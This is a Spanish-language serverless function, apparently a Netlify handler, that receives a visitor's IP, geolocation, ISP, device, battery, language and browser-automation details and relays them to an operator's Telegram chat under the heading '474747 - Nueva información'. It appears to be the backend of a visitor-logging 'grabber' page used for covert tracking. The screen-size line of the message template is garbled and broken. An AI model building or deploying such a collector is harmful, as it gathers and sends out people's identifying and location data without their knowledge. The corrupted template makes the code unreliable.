exports.handler = async (event) => {
  // CORS preflight
  if (event.httpMethod === "OPTIONS") {
    return {
      statusCode: 200,
      headers: {
        "Access-Control-Allow-Origin": "*",
        "Access-Control-Allow-Headers": "Content-Type",
        "Access-Control-Allow-Methods": "POST, OPTIONS"
      },
      body: ""
    };
  }

  if (event.httpMethod !== "POST") {
    return {
      statusCode: 405,
      headers: { "Access-Control-Allow-Origin": "*" },
      body: JSON.stringify({ error: "Method Not Allowed" })
    };
  }

  try {
    const data = JSON.parse(event.body || "{}");

    const TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    if (!TOKEN || !CHAT_ID) {
      return {
        statusCode: 500,
        headers: { "Access-Control-Allow-Origin": "*" },
        body: JSON.stringify({ success: false, error: "Faltan variables de entorno" })
      };
    }

    // Mensaje en texto plano (sin Markdown) para evitar errores
    const mensaje =
`474747 - Nueva información

Red
• IP: ${data.ip || "N/A"}
• País: ${data.country || "N/A"}
• Ciudad: ${data.city || "N/A"}
• Región: ${data.region || "N/A"}
• ISP: ${data.isp || "N/A"}
• Conexión: ${data.conexion || "N/A"}
• RTT: ${data.rtt || "N/A"}

Dispositivo
• OS: ${data.os || "N/A"}
• Navegador: ${data.browser || "N/A"}
• Tipo: ${data.device || "N/A"}
• RAM: ${data.ram || "N/A"}
• Núcleos: ${data.nucleos || "N/A"}
• Pantalla: \( {data.pantalla || "N/A"} ( \){data.pixelRatio || "?"}x)
• Orientación: ${data.orientacion || "N/A"}
• Color: ${data.colorDepth || "N/A"}

Batería
• Nivel: ${data.bateria || "N/A"}
• Estado: ${data.cargando || "N/A"}

Idioma / Zona
• Idioma: ${data.idioma || "N/A"}
• Zona: ${data.zonaHoraria || "N/A"}

Otras
• Táctil: ${data.toque || "N/A"}
• Cookies: ${data.cookies || "N/A"}
• Online: ${data.online || "N/A"}
• Touch points: ${data.maxTouchPoints || 0}
• Webdriver: ${data.webdriver || "N/A"}

${new Date().toLocaleString("es-AR", { timeZone: "America/Argentina/Buenos_Aires" })}`;

    const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: mensaje
        // sin parse_mode → texto plano, más seguro
      })
    });

    const result = await response.json();

    if (!response.ok) {
      console.error("Telegram error:", result);
      return {
        statusCode: 500,
        headers: { "Access-Control-Allow-Origin": "*" },
        body: JSON.stringify({
          success: false,
          error: "Error de Telegram",
          details: result
        })
      };
    }

    return {
      statusCode: 200,
      headers: {
        "Content-Type": "application/json",
        "Access-Control-Allow-Origin": "*"
      },
      body: JSON.stringify({
        success: true,
        message: "Enviado correctamente"
      })
    };

  } catch (error) {
    console.error("Error general:", error);
    return {
      statusCode: 500,
      headers: { "Access-Control-Allow-Origin": "*" },
      body: JSON.stringify({
        success: false,
        error: error.message
      })
    };
  }
};
